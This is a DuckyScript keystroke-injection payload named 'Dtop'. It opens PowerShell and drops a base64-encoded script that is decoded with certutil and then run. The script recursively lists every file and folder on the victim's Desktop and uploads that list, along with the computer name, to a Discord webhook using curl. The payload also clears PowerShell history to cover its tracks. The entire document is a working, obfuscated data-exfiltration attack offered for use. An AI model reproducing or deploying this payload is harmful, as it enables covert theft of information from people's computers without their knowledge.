REM Title      : Dtop
REM Description: Scans Desktop and all directories on it and saves all files, folders and applications names to a .txt and uploads to Discord via webhook. 
REM Author     : dag
REM Version    : 1.0.2
REM Generated by REDD's Encrypted Payload Generator
REM - It is highly suggested you adjust the DELAYS for your use.
DELAY 2000
GUI r
DELAY 200
STRING powershell
DELAY 500
ENTER
DELAY 500
STRING $webhook = "DiscordWebhook";
DELAY 500
STRING $TempFile = "$env:TEMP\temp.ps1"; $File = "$env:TEMP\l.ps1"; echo JGRpcmVjdG9yeVRvU2NhbiA9ICIkZW52OlRFTVBcRTNKazNrdnciDQppZiAoLW5vdCAoVGVzdC1QYXRoIC1QYXRoICRkaXJlY3RvcnlUb1NjYW4pKSB7DQogICAgTmV3LUl0ZW0gLVBhdGggJGRpcmVjdG9yeVRvU2NhbiAtSXRlbVR5cGUgRGlyZWN0b3J5DQp9DQpmdW5jdGlvbiBHZXQtRGVza3RvcEl0ZW1zIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJHBhdGgsDQogICAgICAgIFtpbnRdJGluZGVudExldmVsID0gMA0KICAgICkNCiAgICAkdHh0UGF0aCA9ICIkZW52OlRFTVBcRTNKazNrdndcRGVza3RvcEl0ZW1zLnR4dCINCiAgICAkaXRlbXMgPSBHZXQtQ2hpbGRJdGVtIC1QYXRoICRwYXRoDQogICAgZm9yZWFjaCAoJGl0ZW0gaW4gJGl0ZW1zKSB7DQogICAgICAgICRpbmRlbnRlZE5hbWUgPSAoIiAgICAiICogJGluZGVudExldmVsKSArICRpdGVtLk5hbWUNCiAgICAgICAgV3JpdGUtSG9zdCAiRGVidWc6IEluZGVudGVkIG5hbWUgdG8gYWRkOiAnJGluZGVudGVkTmFtZSciDQogICAgICAgIEFkZC1Db250ZW50IC1QYXRoICR0eHRQYXRoIC1WYWx1ZSAkaW5kZW50ZWROYW1lDQogICAgICAgIGlmICgkaXRlbS5QU0lzQ29udGFpbmVyKSB7DQogICAgICAgICAgICBXcml0ZS1Ib3N0ICJEZWJ1ZzogVHJhdmVyc2luZyBpbnRvIGZvbGRlciAkKCRpdGVtLkZ1bGxOYW1lKSINCiAgICAgICAgICAgIEdldC1EZXNrdG9wSXRlbXMgLXBhdGggJGl0ZW0uRnVsbE5hbWUgLWluZGVudExldmVsICgkaW5kZW50TGV2ZWwgKyAxKQ0KICAgICAgICB9DQogICAgfQ0KfQ0KJHR4dFBhdGggPSAiJGVudjpURU1QXEUzSmsza3Z3XERlc2t0b3BJdGVtcy50eHQiDQppZiAoVGVzdC1QYXRoICR0eHRQYXRoKSB7DQogICAgQ2xlYXItQ29udGVudCAtUGF0aCAkdHh0UGF0aA0KfSBlbHNlIHsNCiAgICBOZXctSXRlbSAtSXRlbVR5cGUgRmlsZSAtUGF0aCAkdHh0UGF0aA0KfQ0KJGRlc2t0b3BQYXRoID0gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoJ0Rlc2t0b3AnKQ0KR2V0LURlc2t0b3BJdGVtcyAtcGF0aCAkZGVza3RvcFBhdGgNCldyaXRlLUhvc3QgIlRleHQgZmlsZSBzYXZlZCBhdDogJHR4dFBhdGgiDQokaGV4Q29sb3IgPSAiNTUyNTgzIg0KJGNvbG9ySW50ID0gW2NvbnZlcnRdOjpUb0ludDMyKCRoZXhDb2xvciwgMTYpDQokY3VycmVudFRpbWUgPSAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5nKCJ5eXl5LU1NLWRkVEhIOm1tOnNzWiIpDQokcGF5bG9hZE9iamVjdFR4dCA9IEB7DQogICAgdXNlcm5hbWUgPSAkZW52OkNvbXB1dGVyTmFtZQ0KICAgIGVtYmVkcyA9IEAoDQogICAgICAgIEB7DQogICAgICAgICAgICB0aXRsZSA9ICJEZXNrdG9wIg0KICAgICAgICAgICAgZGVzY3JpcHRpb24gPSAiU0NBTiBDT01QTEVURSEiDQogICAgICAgICAgICBjb2xvciA9ICRjb2xvckludA0KICAgICAgICAgICAgdGltZXN0YW1wID0gJGN1cnJlbnRUaW1lDQogICAgICAgIH0NCiAgICApDQp9DQokcGF5bG9hZEpzb25UeHQgPSAkcGF5bG9hZE9iamVjdFR4dCB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCA0DQokdGVtcEZpbGVUeHQgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRUZW1wRmlsZU5hbWUoKQ0KU2V0LUNvbnRlbnQgLVBhdGggJHRlbXBGaWxlVHh0IC1WYWx1ZSAkcGF5bG9hZEpzb25UeHQNCiRjdXJsQ29tbWFuZFR4dCA9IEAoDQogICAgJ2N1cmwuZXhlJywNCiAgICAnLUYnLCAoInBheWxvYWRfanNvbj08JHRlbXBGaWxlVHh0IiksDQogICAgJy1GJywgKCJmaWxlPUAkdHh0UGF0aDtmaWxlbmFtZT1EZXNrdG9wSXRlbXMudHh0IiksDQogICAgJHdlYmhvb2sNCikNCiYgJGN1cmxDb21tYW5kVHh0WzBdICRjdXJsQ29tbWFuZFR4dFsxLi4oJGN1cmxDb21tYW5kVHh0Lkxlbmd0aCAtIDEpXQ0KaWYgKCRMQVNURVhJVENPREUgLW5lIDApIHsNCiAgICBXcml0ZS1Ib3N0ICJDdXJsIGV4aXRlZCB3aXRoIGNvZGUgJExBU1RFWElUQ09ERSINCn0NClJlbW92ZS1JdGVtIC1QYXRoICR0ZW1wRmlsZVR4dA0KUmVtb3ZlLUl0ZW0gLVBhdGggJGRpcmVjdG9yeVRvU2NhbiAtUmVjdXJzZQ0K > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
DELAY 1000
ENTER
STRING Clear-History
ENTER
STRING exit
ENTER
